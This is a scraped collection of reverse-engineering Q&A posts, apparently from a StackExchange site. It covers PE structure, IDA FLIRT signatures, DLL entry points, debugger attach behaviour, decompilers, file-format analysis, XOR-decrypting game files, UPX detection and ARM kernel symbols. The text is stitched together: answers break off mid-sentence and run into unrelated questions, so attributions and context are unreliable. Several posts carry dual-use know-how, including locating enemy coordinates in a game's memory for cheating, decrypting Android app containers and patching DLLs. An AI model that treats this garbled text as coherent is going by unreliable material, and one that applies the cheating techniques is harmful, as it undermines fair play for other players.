<p>If you are in to Python: <a href=""http://code.google.com/p/pefile/"" rel=""noreferrer""><code>pefile</code></a> has been mentioned as a library that can access PE parts, but then again PE has been so long around there is no end to good descriptions of all the gory low level details of all its headers and structures. Last time I felt inspecting some Windows program, I used these descriptions to write a full set of PE import/export C routines from scratch (.. <em>again</em>, I should add -- this way I can have return it the exact data I want in exactly the required format).</p>

<p>IDA Pro seems to be the utility of choice for most disassembling jobs, and last time I used that it did a good job of loading both Import and Export directories, although it didn't provide a concise list of all functions.</p>

"What is a FLIRT signature?","11103","","<p>I've seen this referenced in a couple of other questions on this site.  But what's a FLIRT signature in IDA Pro?  And when would I create my own for use?</p>

<p>Peter explained the basics, but here's a white paper about how it's implemented:</p>

<p><a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"">https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml</a></p>

<blockquote>
  <p>To address those issues, we created a database of all the functions
  from all libraries we wanted to recognize. IDA now checks, at each
  byte of the program being disassembled, whether this byte can mark the
  start of a standard library function. </p>
  
  <p>The information required by the recognition algorithm is kept in a
  signature file. Each function is represented by a pattern. Patterns
  are first 32 bytes of a function where all variant bytes are marked.</p>
</blockquote>

<p>It's somewhat old (from IDA 3.6) but the basics still apply.</p>

<p>To create your own signatures, you'll need FLAIR tools, which can be downloaded separately.<br>

"Difference between DllMain and DllEntryPoint","10967","","<p>I have a piece a malware I was share with. (I do this for fun, anyways)
Is a DLL according to the <code>IMAGE_FILE_HEADER-&gt;Characteristics</code>. I was trying to do some dynamic analysis on it. I have done the following:</p>

<ul>
<li>Run it with <code>rundll32.exe</code>, by calling its exports. Nothing.</li>
<li>Changed the binary's characteristics to an exe. Nothing. </li>
</ul>

<p>So I moved on to static analysis, Loaded on IDA and OllyDbg. 
Which brings me to my question. :)</p>

<p><strong>What is the main difference between <code>DllMain</code> and <code>DllEntryPoint</code>?</strong></p>

<p><strong>When/How does one get call vs the other?</strong></p>

<p><strong>[EDIT]</strong></p>

<p>So after reading MSDN and a couple of books on MS programming. I understand <code>DllEntryPoint</code>.
<code>DllEntryPoint</code> is your <code>DllMain</code> when writing your code. Right?!
So then why have <code>DllMain</code>. In other words, when opening the binary in IDA you have <code>DllEntryPoint</code> and <code>DllMain</code>. </p>

<p>I know it is probably something easy but I am visual person, so obviously not seeing something here.</p>
","<p>Both, <code>DllMain</code> and <code>DllEntryPoint</code> are merely symbolic names of the same <em>concept</em>. They even share the same prototype. But they aren't the same:</p>

<blockquote>
  <p>The function must be defined with the <code>__stdcall</code> calling convention.
  The parameters and return value must be defined as documented in the
  Win32 API for <code>WinMain</code> (for an .exe file) or <code>DllEntryPoint</code> (for a DLL).
  It is recommended that you let the linker set the entry point so that
  the C run-time library is initialized correctly, and C++ constructors
  for static objects are executed.</p>
  
  <p>(MSDN Library from Visual Studio 2005)</p>
</blockquote>

<p>The entry point in a DLL is the same as in an EXE <em>technically</em>, but with different semantics and prototype (EXE vs. DLL). Both are to be found at <code>IMAGE_OPTIONAL_HEADER::AddressOfEntryPoint</code>. However, in a DLL this entry point is optional (although usually supplied by the runtime library). <strong>The entry point isn't explicitly exported through the export directory</strong> (although IDA for example shows them under ""Exports""). Most of the time there is no public name attached to this entry point, which is why the documentation refers to it as <code>DllEntryPoint</code>. If you find this name in the export directory of the PE file it's probably not the actual entry point from the PE optional header (this would have to be confirmed by looking at the exact sample, though). The last point, btw, holds for <code>DllMain</code> as well.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx"" rel=""nofollow noreferrer""><code>DllMain</code></a> is the name the <strong>runtime library</strong> (ATL, MFC ...) implementation expects you to supply. It's a name the linker will see <em>referenced</em> from the default implementation of <code>DllEntryPoint</code> which is named <code>_DllMainCRTStartup</code> in the runtime implementations. See the CRT source files <code>crtdll.c</code> and <code>dllcrt0.c</code> if you have Visual Studio.</p>

<p>This means that <code>DllEntryPoint</code> <strong>calls</strong> <code>DllMain</code> - assuming default behavior. The runtime-implemented entry point function (<code>_DllMainCRTStartup</code>) does other initialization.</p>

<p>You can override this name by using the <a href=""http://msdn.microsoft.com/en-us/library/f9t8842e%28v=vs.80%29.aspx"" rel=""nofollow noreferrer""><code>/entry</code> command line switch</a> to the linker. Again, it's just a name and you can choose whatever you fancy. The limitations (not being able to load another DLL using <code>LoadLibrary</code> from within the entry point and so on) are independent of the name you give the function.</p>

<hr>

<p>Side-note: in an EXE the TLS callbacks run before the entry point code, which can be dangerous in malware research. <s>I don't think this is relevant to DLLs, though, but if someone has more knowledge in that area I'm interested to see pointers to material.</s></p>

<p><a href=""https://reverseengineering.stackexchange.com/users/1323/peter-ferrie"">Peter Ferrie</a>, a distinguished reverser and malware analyst, pointed out in a comment to this answer:</p>

<p>There's a nice <a href=""http://nelenkov.blogspot.com/2012/07/using-app-encryption-in-jelly-bean.html"">blog post</a> that says the encryption used is TwoFish, with a key stored in <code>/data/misc/systemkeys/AppsOnSD.sks</code>, but I haven't been able to decrypt the file using the naïve strategy of just using that key directly with TwoFish on the <code>.asec</code>.</p>

<p>How can I decrypt this to get an apk I can actually analyze?</p>

<p>Note: I realize that this information is considered somewhat delicate in places like xda-developers, since it could be used to enable piracy. I have no such intentions, I just want to examine the serialization code.</p>
","<p>After a little bit more work and some more careful re-reading, I figured out my mistake: the files in <code>/data/app-asec/</code> are the encrypted <em>containers</em>. They're actually dm-crypt volumes, which then get mounted at <code>/mnt/asec/[app_id]</code>. The <code>pkg.apk</code> in that directory is the unencrypted apk that can be analyzed using any of the fine tools in <a href=""https://reverseengineering.stackexchange.com/a/46/257"">this answer</a>.</p>

"How can I prevent Immunity Debugger / OllyDbg from breaking on attach?","10193","","<p>When I attach OllyDbg or ImmunityDebugger to a process, it automatically breaks execution. I'm attaching to a user-mode service running as SYSTEM and only need to catch exceptions, so this is not ideal. Is there a way to disable the break-on-attach behaviour?</p>
","<h1>Explanation</h1>

<p>The break on attach is due to the <code>ntdll</code> <code>DbgUiRemoteBreakin</code> and <code>DbgBreakPoint</code> functions being called. If you check the <code>kernel32</code> <code>DebugActiveProcess</code> function called by the debugger, OllyDbg or ImmunityDebugger, you will see a call to the <code>CreateRemoteThread</code>, <code>CreateRemoteThreadEx</code>, or <code>ZwCreateThreadEx</code> function depending on your OS.</p>

<p>So, i guess one way to bypass breaking is:</p>

<ol>
<li>debug the debugger itself</li>
<li>go to the <code>DbgUiIssueRemoteBreakin</code> function and spot the call to the function creating the remote thread.</li>
<li>change the <code>lpStartAddress</code> parameter in case of <code>CreateRemoteThread</code>/<code>CreateRemoteThreadEx</code> to <code>DbgBreakPoint</code>+1 <code>RETN 0xC3</code></li>
</ol>

<h1>Plugin</h1>

<p>I created an OllyDbg v1.10 <a href=""http://code.google.com/p/ollytlscatch/downloads/detail?name=SilentAttach.dll"">plugin</a> which <code>NOP</code>s the <code>INT3</code> in <code>DbgBreakPoint</code> in the process with the PID you choose. It has only been tested on Windows 7.</p>

<h2>Usage</h2>

<p>Place SilentAttach.dll in OllyDbg directory, fire OllyDbg, Press <kbd>Alt</kbd>+<kbd>F12</kbd>, and then enter process Id of the process you want to silently attach to.</p>

<p>N.B.
Since no break occurs, OllyDbg does not extract many piece of info. e.g. list of loaded module. So, you have to activate the context by something like <kbd>Alt</kbd>+<kbd>E</kbd> then <kbd>Alt</kbd>+<kbd>C</kbd></p>

<p>Does knowing the compiler used to generate an application help me to more effectively reverse engineer back from the generated object to what the source code might have been, and if it does help, how so?</p>
","<p>There is some academic research in this area, the keywords you want are 'toolchain provenance'. There was a pretty good paper by <a href=""ftp://ftp.cs.wisc.edu/paradyn/papers/Rosenblum10prov.pdf"">Nate Rosenblum on this topic</a>, it's been a while since I read this paper but you can use many techniques to establish this information. I think some use machine learning and others can use a big pile of heuristics or axioms about compiler behavior. </p>

<p>Establishing this is of limited utility IMO. It could be useful in an adversarial situation where you're trying to get intelligence about a malware group or threat actor, but also keep in mind that this kind of information can be obfuscated or destroyed. One potential use of this information would be to establish that some binary software was compiled using some companies SDK that included a compiler with signature information unique to that company. Establishing the tool chain provenance can help you make a case that someone who bought your SDK is in violation of a license or contract, say by producing malware. </p>

<p>An example of behavior differences is parameter writing. There are two ways to place a value onto the stack, one using 'push' and another using <code>mov</code> with an address based in <code>esp</code> as the destination operand. So one compiler can do this:</p>

<pre>
push eax
push ebx
</pre>

<p>And another can do this:</p>

<pre>
mov [esp+foo], eax
mov [esp+foo+4], ebx

It is the real main function of the program (which is possibly not your main function, but your main function will be called somehow from it).</p>

<p>Actually you can not find main function by name because this information does not exist in the executable: the computer doesn't need it for program execution.
Information about function, variable and type names and relation between CPU instructions and lines of real source code called ""debug information"" and

"How to find arrays of objects (entities, enemies) in a game I'm reversing with Cheat Engine?","8959","","<p>I am reversing a game using Cheat Engine and OllyDBG, through this memory addresses within an FPS game  are read and monitored, these addresses will contain the coordinates(xyz) of enemies.</p>

<p>My Objective is to find an address or a pattern that will allow me to loop through up to 32 enemies in order to read all their coordinates, in order to do this I have been attempting to find a pattern between each of their addresses with no luck. I have been able to collect 3 different enemy addresses, this information is useful but searching through 32 addresses is a task which requires more effort than I believe is necessary.</p>

<p>As stated I have access to the first 3 enemy addresses and if from that information it is possible to trace back to the base either through Cheat Engine or other reverse engineering software the process would be appreciated.</p>

<p>Ultimately my question is, is there a way to detect a pointer array in memory from one of its addresses, for example if if I have 3 enemy coordinates can I somehow trace the memory location back to an address that accesses all 32 enemy addresses whether it is by using cheat engine or another reversing tool.</p>
","<p><em>(OP didn't specify if he knows how structures are laid out. Looks like he assumes they aren't complex. I'll answer a more general question to avoid locality issues by assuming the structures are somewhat complex)</em></p>

<p>Few ways to find the other structures come to mind:</p>

<h2>Scanning memory for signatures</h2>

<p>Once you have a few examples of the structures, maybe the easiest way to find the other structure instances is to find matching constants in all three structures. Some values may be constant, represent properties that apply to all the enemy entities in a more high-level class inherited.</p>

<h3>Pros:</h3>

<ul>
<li>This is easy to implement, can be done this Cheat Engine.</li>
<li>in the general case it should survive program restarts, you won't need to find the three structures every time you run the game.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>not so robust. stuff might change between versions, data you think is constant may actually change in some cases you haven't looked at. </li>
</ul>

<h2>Pointer searching</h2>

<p>There might be a pointer to each entity somewhere. you can just as easily search the memory for the addresses of the structures you found, and detect the array/structure that holds all of the entities. you could also walk trough arrays you find in the structures themselves, you might be looking at a linked list.</p>

<h3>Pros:</h3>

<ul>
<li>easy to implement.</li>
<li>will be a bit more robust than the previous method.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>you will still need to somehow find the first entities.</li>
</ul>

<h2>Finding the Constructor/constructor-like function</h2>

<p>Either Object Oriented language like C++ or ObjC, or a procedural language like C, there must be a function that initiates the structure. usually it's easy to find - the first function called after the object is allocated, pretty distinctive assembly - mostly initialization code.</p>

<p>If we're talking about OO code, finding the virtual function table or a similar construct will let you easily find the construction functions, walk trough inheritance and find at least a portion of the manipulating functions.</p>

<p>After you get the Constructors you can easily get all the allocations, and see where pointers are being kept.</p>

<h3>Pros:</h3>

<ul>
<li>quite robust</li>
<li>better understanding of how entities are saved in memory.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>Static RE. usually harder to do (Get a good dis-assembler)</li>
</ul>

<h2>Reversing the structure</h2>

<p>This one requires a bit more reversing work, but will let you find the best ways to search for the entities. Using Cheat Engine and IDA, manually map the structure, the elements/members, the functions that manipulate the structure.</p>

<p>If there're any pointers involved, follow them and reverse other structures you encounter.</p>

<h3>Pros:</h3>

<ul>
<li>Robust</li>
<li>The right way to do what you want. Really understand what's going on. facilitate future abilities/features.</li>
</ul>

<h3>Cons:</h3>

<ul>
<li>more work, and harder to do. A lot of RE.</li>
</ul>

<h2>Note</h2>

<p>for at-least some of the methods I mentioned finding the pointers to all entities while analyzing the program might only be the first step. You can search for references to the list itself and get a better way to automatically find the entities on each program restart. This eliminates some of the Cons.</p>

"How to identify function calls in IDA Pro's disassembly?","8151","","<p>I am reverse engineering some code from which IDA has generated the following disassembly. These specific lines of code are just for illustrative purposes. Notice that the third line does not call a specifc function by its name but rather by its address.</p>

<pre><code>mov rcx, [rsp+128h+var_D8]    // reg CX gets the address at stack pointer+128h+var_D8 bytes 
mov r8, [rcx]                 // the address at reg CX is stored to reg r8

<p>From an answer to my <a href=""https://reverseengineering.stackexchange.com/questions/2119/what-to-do-when-ida-cannot-provide-a-function-name"">previous question</a>, this is known as an ""indirect call"" or (perhaps a ""virtual function call"").

How do I go about figuring out which one was actually being called during any given indirect call (or virtual call)? </p>
","<p>The easiest way to find out the function in question would probably be by dynamic analysis. You can easily do this by placing a breakpoint on that instruction in a debugger and examining the registers. </p>

<p>A more general solution would probably involve some scripting to record all calls and add that information to the IDA database. <a href=""https://github.com/deresz/funcap"">Funcap</a> plugin does something similar if not exactly what you are looking for:</p>

<blockquote>
  <p>This script records function calls (and returns) across an executable using IDA debugger API, along with all the arguments passed. It dumps the info to a text file, and also inserts it into IDA's inline comments. This way, static analysis that usually follows the behavioral runtime analysis when analyzing malware, can be directly fed with runtime info such as decrypted strings returned in function's arguments.</p>

<p>Ultimately, you are probably better off learning to read the disassembly. One thing that I commonly do is manually convert individual code blocks to pseudo-code; in IDA you can then right-click on a code block, select 'Group Nodes' and replace the disassembly in that code block with whatever text you want (e.g., the pseudo code). This makes it much easier to break down and understand complex functions.</p>

"How to find offsets in OllyDBG from IDA","7903","","<p>I'm currently trying to gain some practice in RE and I need some help for patching a DLL.
Here are my steps:
I first analyze the main program and the dll in IDA trying to understand the logic. I then switch to OllyDBG for patching. Well, the problem is, since Olly dynamically loads the dll (in contrast to the static standalone analysis in IDA), the offsets are different and I don't know how to find the offset that I've inspected in IDA.
Is there some easy way to ""rediscover"" the offset in the dll?</p>

<p>Thanks in advance!</p>
","<p>If only the base is changed, but offsets are constant (as I'd guess is the case), you can just rebase the program in IDA. You can do so by edit->segments->Rebase program ... menu.

"Advantages of OllyDbg 1 over OllyDbg 2","7742","","<p>I see that most RE tutorials around the web that give RE examples use OllyDbg 1, even if the tutorial was written after the release of OllyDbg 2.</p>

<p>Is there any particular reason for that? Is version 2 too buggy, or were some of the features dropped?</p>
","<p>Well, there is another reason. Historical one, actually.</p>

<p>At end of 2001, when the first versions of Ollydbg were presented, there was SoftICE, which was at its end, and IDA was not that popular yet. So OllyDBG became sort of the de-facto replacement for the main black-hat tool for cracking\patching\keygen-writing. And OllyDBG 1.x is a good, handy tool.</p>

<p>Since then, the development of OllyDBG became a slow process, with lots of delays. When it was finally announced, there appeared to be some problems, plug-ins compatibility etc. You may see the  story at OllyDBG 2.x <a href=""http://www.ollydbg.de/version2.html"">webpage</a> on offsite.</p>

<p>On the other hand, IDA Pro of Hex-Rays proved itself as a useful tool, very handy.</p>

<p>The bottom line - when in June 2010 version 2.0 of OllyDBG was released, it was buggy, didn't support old plug-ins and there were no reason to change to the new version, at least for me. In addition, many manuals were available for version 1.x, and the benefits of version 2.0 for tasks OllyDBG was used for were not attractive enough, IMHO.</p>

"Can I create an object file using gcc that cannot be reverse engineered?","7530","","<p>Is it possible to create an object file using <code>gcc</code> that cannot be reverse engineered to its source code ?</p>
","<p>AFAIK that is not possible. There are other things you can keep in mind however:</p>

<p>Use of the GCC optimization flags will help make the code look much less readable to a human. When you compile with the highest level of optimization <code>gcc -O3</code> the compiler will move things around such that the ""flow"" might not be at all what you expect. </p>

<p>You can also use the flag <code>-static</code> which will force gcc to take small functions and make them inline. This will embed them into your code instead of showing as function calls.. it will make them harder to distinguish. </p>

<p>One thing to keep in mind is too it's important to get rid of any unneeded symbols. Gcc offers <code>-fvisibility=hidden</code> and <code>-fvisibility-inlines-hidden</code> to help with this. You can also pass the <code>-s</code> flag to gcc to strip symbols away.</p>

<p>I think that's about all you can do with <em>gcc</em> to help prevent reverse engineering. Additionally you can use code obfuscation, but there are issues there as well unless you implement it yourself, if you use a readily available method or tool to prevent reverse engineering, there is probably already a tool to counter it.</p>

<p>Keep in mind that the final executable will have information in it as well such as what version of gcc it was compiled with. This too can be removed with the <code>strip</code> command. </p>

<p>If I have an executable (<code>myprog</code>) I can run <code>objdump</code> on it to check some information:</p>

<pre><code>mike@mike-VirtualBox:~/C$ objdump --full-contents --section=.comment myprog | head
myprog:     file format elf64-x86-64

"How to reverse engineer a proprietary data file format (e.g. Smartboard Notebook)?","7423","","<p>How should I begin trying to reverse engineer this file format? The only thing I can think of is saving a simple file, and then dig in with a hex editor. But since the file format may be some kind of archive, that seems like the wrong approach. I've always been a little interested in the idea of reverse-engineering a file format, but I never actually attempted it. How should I begin?</p>

<p>In particular, I am interested in <a href=""http://smarttech.com/us/Solutions/Education+Solutions/Products+for+education/Software/SMART+Notebook+collaborative+learning+software/SMART+Notebook+collaborative+learning+software"">Smart Notebook</a> which loads and saves data into .notebook files.  This is an undocumented proprietary file format. SMART is the leading manufacturer of white boards and their notebook software is therefore one of the most popular formats for educational (presentation) content. There is an open standard for whiteboard files and <a href=""http://open-sankore.org/"">Open Sankore</a> is an open source program that can open and save them.  However, Smart Notebook is not fully compatible with the open whiteboard format so I really would like to understand the .notebook file format so that I can write software that makes use of it. The open stand (.iwb files) are zip archives that contain images and SVG data. It occurs to me that .notebook files may also be compressed or at least contain a number of sub-files within it (like images and swf files).  </p>
","<p>Well, obviously the particulars will very much depend on the particulars of the file format and what you expect to achieve in general. However, some steps will largely be the same. One thing you could do is:</p>

<ol>
<li>try hard to find all kinds of clues about the format. This can be a small note in some bulletin board or the cached copy of some year old website that has since vanished. Often the gems won't pop up as top search results when you are looking for something specific enough. Weeding through pages of search results <em>can make sense</em>. Als make sure to use tools such as <code>file</code> which look for magic bytes and would be able to identify things not obvious to the naked eye.</li>
<li>find a proprietary program that uses the format and is able to read/write it (you seem to have that)
<ol>
<li>Use a trial &amp; error technique such as making distinct changes to the document, saving them and observing and noting down the differences, AFAIK this is how the MS Office file formats were decoded initially for StarOffice (now OOo and LibreOffice)</li>
<li>reverse engineer the program itself to find the core routines reading and writing the data format</li>
</ol></li>
<li>find an open source program in the same way -> read its source</li>
</ol>

<p>If you understand the language in which the program from option 3 is written, no problem at all. If you don't have that or if you are faced with other challenges then you have to resort to the good old technique outlined in point 2, patching gaps with pieces you gather with method 1.</p>

<p>The point 2.1 should be obvious: you want to find out how recursive text is encoded? Type some text, format it, save, observe the change. Rinse, lather, repeat.</p>

<p>Point 2.2 will take a lot more effort and should likely be used sparsely to make sure you got details from 2.1 right.</p>

<ol>
<li><p>Changing the machine code itself:<br>
The representation of the machine code does not need to be 1's and 0's, you can use any other number system. Anyway machine code is really, really hard to read and edit. Additionally you have also the same problems like you 'simply' disassemble the program.  </p></li>
<li><p>Use a disassembler and modify the assembler code:<br>
You have to take care of the memory layout of the software you want to modify. Since any change on some string could override another variable. And assembler is also not easy to read and write. So depending on the size of the software, it takes some time to get a basic overview about where to change the code.</p></li>
<li><p>Or use a decompiler:<br>
But you mostly won't get any useful variable names, since the compiler removes them most of the time. </p></li>

I want to read some text that is inside a .DAT file, but is ""encrypted"" or ""compressed"" (I don't know which is the right ""term"" for this). The file is from the game SMITE, and this file has basically most of the text in the game (like unreleased Item descriptions) and that's why I want to read the file :D</p>

<p><strong>Previous versions of the file could be readed with Notepad ++, like this:</strong>
<a href=""https://i.stack.imgur.com/LCi71.png"" rel=""nofollow noreferrer"">http://i.stack.imgur.com/LCi71.png</a></p>

<p>But current versions are just random letters and <strong>NULL</strong> characters. (I can't post a picture because of the ""only two links"" restriction).</p>

<p>I'm interested in just two files. One, is named ""Lang_INT.dat"", inside the Localization folder, there is another file in that folder named ""GFxTranslation.int"", which has some text that appears in the Lobby Screen and things like that, that's why the ""Localization"" folder has to be where the text is... but in the first picture that I shared, you can see text that appears in-game and also in the lobby screen, and it's on another folder named ""Content"" and the file is named ""assembly.dat"", with another file named ""behavior_trees.dat"" but I think that file is not important to me.</p>

<p>By the way, this maybe would be usefull as a ""reference"", there is another .DAT file named ""word filter"" which (i suppose) has the ""bad words"" that are censored in the chat if the word filter is activated. This .DAT is inside the Localization folder.</p>

<p>I'll appreciate any kind of help on this, I did some research but I did not find anything that is usefull... the only thing that I know is: A person who has no knowledge about programing or ""some"" knowledge, could ""de-compress"" ""decrypt"" one of this files...or that is what looks like, and no, that person do not want to help me :c</p>

<p>Thanks in advance again, and sorry for bad English:</p>

<p>-Agustín</p>
","<p>These files are definitely not compressed. behavior_trees.dat is a binary file which is not encrypted and not compressed, just binary. Encryption, as far as I can see, looks like substitution cipher which should be relatively easy to crack with frequency analysis if you know what should be there. Assuming that decrypted content of files from older and newer versions are similar you can try to account frequencies of symbols on a base of files of previous versions.</p>

<p>Here is what I'd do for decrypting (for example) assembly.dat file:</p>

<ol>
<li>Get a corresponding file from previous version which should be not encrypted.</li>
<li>Account frequency of appearance of each symbol (should be easily done with simple python script)</li>
<li>Account frequency of appearance of each symbol in newer version files.</li>
<li>Try to replace symbols from the newer files to the symbols with same (or alike) appearance rate from the older file and see what happends.</li>
</ol>

<p>UPDATE, Just for the sake of completeness:</p>

<p>I used an excellent tool <a href=""http://blog.didierstevens.com/programs/xorsearch/"" rel=""nofollow"">XorSearch</a> by Didier Stevens (it was mentioned by @Andy Dove in answer to another question, which reminded me to return to this one) and found out the following:</p>

<ul>
<li>Assuming that the decrypted content of current file is similar to content of previous I tried to find some words from the picture you provided with this tool (for example words like item, Pickup and Physical) .</li>
<li>The tool shows that it is xor substitution cipher, the key is 0x2a, applying it to word filter  and lang int files gives reasonable result.</li>
<li>Applying this key gives a lot of reasonable strings, for all files I tried the key was the same.</li>
<li>According to your claim you know some basics in programming. Which means that you'll be able to run the following python script on your files and understand what happens or translate it to the language of your choice.</li>
</ul>

<p>Good luck.</p>

For example, if you have a function that implements the <a href=""https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm"" rel=""nofollow noreferrer"">TEA algorithm</a>, scanning the disassembled file for <code>9e3779b9</code> could help you. (There's a tool named signsrch that does this for many well-known encryption and checksum variants). Or, if you know the function uses a certain string, search for this string, then check where it's cross referenced.</p>

<p>You might be even lucky enough that the programmer used an <code>assert</code> (or similar) macro. Depending on the Compiler, this often translates to a <code>printf</code> which includes <code>__FUNC__</code> which in turn is replaced with the function name, so an assert macro will most likely put the function name as a string, along with a cross reference from your function, into your binary.</p>

<p>Once you have a string that you know belongs to your function, use <code>CTRL-R</code> on it to find where it's referenced in code (<a href=""https://stackoverflow.com/questions/24554127/ollydbg-2-01-finding-a-command-referencing-a-static-string"">longer explanation on stackoverflow</a>).</p>

","<p>As for the automated approach, the <a href=""http://en.wikipedia.org/wiki/File_(command)"">file command</a> is the classic recommendation. It's a tool which tries to guess the file type from the data contained in the file.

If you have a composite file you could try <a href=""https://code.google.com/p/binwalk/"">binwalk</a> which will try to find files as subsets of a larger file.</p>

<p>If you want to go the manual route, you need to match some subset of the file to a known signature or pattern. This applies especially when it comes to file formats which are likely to be compressed as data patterns will be less regular. Therefore you usually need to find a pattern, usually called a signature or fingerprint, in the file structure. Most file formats have magic numbers either in the header or the footer of the file in order to make it easy for programs to check what type of file they are about to load.

"How to check if an ELF file is UPX packed?","6623","","<p>I have an ELF file and want to know if it is UPX packed. How can I detect UPX compression in GNU/Linux?</p>
","<p>Okay, assuming vanilla UPX you should be fine by detecting the strings <code>UPX!</code> or <code>UPX0</code>. As far as I remember this would also work on Windows.</p>

<p>So it's a shell one-liner such as:</p>

<pre><code>grep UPX\! &lt;filename&gt;
</code></pre>

<p>or</p>

<pre><code>grep UPX0 &lt;filename&gt;
</code></pre>

<p>... assuming the GNU version of <code>grep</code> here.</p>

"Why are machine code decompilers less capable than for example those for the CLR and JVM?","6568","","<p>Java and .NET decompilers can (usually) produce an almost perfect source code, often very close to the original.</p>

<p>Why can't the same be done for the native code? I tried a few but they either don't work or produce a mess of gotos and casts with pointers.</p>
","<p>TL;DR:  machine code decompilers are very useful, but do not expect the same miracles that they provide for managed languages.  To name several limitations:  the result generally can't be recompiled, lacks names, types, and other crucial information from the original source code, is likely to be much more difficult to read than the original source code minus comments, and might leave weird processor-specific artifacts in the decompilation listing.</p>

<ol>
<li><p><strong>Why are decompilers so popular?</strong></p>

<p>Decompilers are very attractive reverse engineering tools because they have the potential to save a lot of work.  In fact, they are so unreasonably effective for managed languages such as Java and .NET that ""Java and .NET reverse engineering"" is virtually non-existent as a topic.  This situation causes many beginners to wonder whether the same is true for machine code.  Unfortunately, this is not the case.  Machine code decompilers do exist, and are useful at saving the analyst time.  However, they are merely an aid to a very manual process.  The reason this is true is that bytecode language and machine code decompilers are faced with a different set of challenges.</p></li>
<li><p><strong>Will I see the original variable names in the decompiled source code?</strong></p>

<p>Some challenges arise from the loss of semantic information throughout the compilation process.  Managed languages often preserve the names of variables, such as the names of fields within an object.  Therefore, it is easy to present the human analyst with names that the programmer created which hopefully are meaningful.  This improves the speed of comprehension of decompiled machine code.</p>

<p>On the other hand, compilers for machine-code programs usually destroy most of all of this information while compiling the program (perhaps leaving some of it behind in the form of debug information).  Therefore, even if a machine code decompiler was perfect in every other way, it would still render non-informative variable names (such as ""v11"", ""a0"", ""esi0"", etc.) that would slow the speed of human comprehension.</p></li>
<li><p><strong>Can I recompile the decompiled program?</strong></p>

<p>Some challenges relate to disassembling the program.  In bytecode languages such as Java and .NET, the metadata associated with the compiled object will generally describe the locations of all code bytes within the object.  I.e., all functions will have an entry in some table in a header of the object.</p>

<p>In machine language on the other hand, to take x86 Windows disassembly for example, without the help of heavy debug information such as a PDB the disassembler does not know where the code within the binary is located.  It is given some hints such as the entrypoint of the program.  As a result, machine code disassemblers are forced to implement their own algorithms to discover the code locations within the binary.  They generally use two algorithms:  linear sweep (scan through the text section looking for known byte sequences that usually denote the beginning of a function), and recursive traversal (when a call instruction to a fixed location is encountered, consider that location as containing code).</p>

<p>However, these algorithms generally will not discover all of the code within the binary, due to compiler optimizations such as interprocedural register allocation that modify function prologues causing the linear sweep component to fail, and due to naturally-occurring indirect control flow (i.e. call via function pointer) causing the recursive traversal to fail.  Therefore, even if a machine code decompiler encountered no problems other than that one, it could not generally produce a decompilation for an entire program, and hence the result would not be able to be recompiled.</p>

<p>The code/data separation problem described above falls into a special category of theoretical problems, called the ""undecidable"" problems, which it shares with other impossible problems such as the Halting Problem.  Therefore, abandon hope of finding an automated machine code decompiler that will produce output that can be recompiled to obtain a clone of the original binary.</p></li>
<li><p><strong>Will I have information about the objects used by the decompiled program?</strong></p>

<p>There are also challenges relating to the nature of how languages such as C and C++ are compiled versus the managed languages; I'll discuss type information here.  In Java bytecode, there is a dedicated instruction called 'new' to allocate objects.  It takes an integer argument which is interpreted as a reference into the .class file metadata which describes the object to be allocated.  This metadata in turn describes the layout of the class, the names and types of the members, and so on.  This makes it very easy to decompile references to the class in a way that is pleasing to the human inspector.</p>

<p>When a C++ program is compiled, on the other hand, in the absence of debug information such as RTTI, object creation is not conducted in a neat and tidy way.  It calls a user-specifiable memory allocator, and then passes the resulting pointer as an argument to the constructor function (which may also be inlined, and therefore not a function).  The instructions that access class members are syntactically indistinguishable from local variable references, array references, etc.  Furthermore, the layout of the class is not stored anywhere in the binary.  In effect, the only way to discover the data structures in a stripped binary is through data flow analysis.  Therefore, a decompiler has to implement its own type reconstruction in order to cope with the situation.  In fact, the popular decompiler Hex-Rays mostly leaves this task up to the human analyst (though it also offers the human useful assistance).</p></li>
<li><p><strong>Will the decompilation basically resemble the original source code in terms of its control flow structure?</strong></p>

<p>Some challenges stem from compiler optimizations having been applied to the compiled binary.  The popular optimization known as ""tail merging"" causes the control flow of the program to be mutilated compared to less-aggressive compilers, which usually manifests itself as a lot of goto statements within the decompilation.   The compilation of sparse switch statements can cause similar problems.  On the other hand, managed languages often have switch statement instructions.</p></li>
<li><p><strong>Will the decompiler give meaningful output when obscure facets of the processor are involved?</strong></p>

<p>Some challenges stem from architectural features of the processor in question.  For example, the built-in floating point unit on x86 is a nightmare of an ordeal.  There are no floating point ""registers"", there is a floating point ""stack"", and it must be tracked precisely in order for the program to be properly decompiled.  In contrast, managed languages often have specialized instructions for dealing with floating-point values, which are themselves variables.  (Hex-Rays handles floating point arithmetic just fine.)  Or consider the fact that there are many hundreds of legal instruction types on x86, most of which are never produced by a regular compiler without the user explicitly specifying that it should do so via an intrinsic.  A decompiler must include special processing for those instructions which it supports natively, and so most decompilers simply include support for the ones most commonly generated by compilers, using inline assembly or (at best) intrinsics for those which it does not support.</p></li>
</ol>

<p>These are merely a few of the accessible examples of challenges that plague machine code decompilers.  We can expect that limitations will remain for the foreseeable future.  Therefore, do not seek a magic bullet that is as effective as managed language decompilers.</p>

"Locating Linux Kernel Symbols on ARM","6510","","<p>Igor posted a great <a href=""https://stackoverflow.com/a/14811668/139463"">answer</a> previously on SO about the format of the Linux kernel image on ARM.</p>

<p>Assuming I can't boot my kernel image, can someone give me pointers on finding this compressed symbol table in the binary?  </p>
","<p>After decompressing and loading the kernel, you need to find a couple of tables that encode the compressed symbol table. These are (in the usual order they are placed in binary):</p>

<ul>
<li><code>kallsyms_addresses</code> - a table of addresses to all public symbols in the kernel</li>
<li><code>kallsyms_num_syms</code> - not a table but just an integer with total number of symbols (should match previous table)</li>
<li><code>kallsyms_names</code> - a list of length-prefixed byte arrays that encode indexes into the token table</li>
<li><code>kallsyms_token_table</code> - a list of 256 zero-terminated tokens from which symbol names are built</li>
<li><code>kallsyms_token_index</code> - 256 shorts pointing to the corresponding entry in <code>kallsyms_token_table</code></li>
</ul>

<p>They're not hard to find with some experience. A good way to find the first one is to look for several 0xC0008000 values in a row, because a typical kernel symbol table starts like this:</p>

<pre><code>C0008000 T __init_begin
C0008000 T _sinittext
C0008000 T _stext
C0008000 T stext
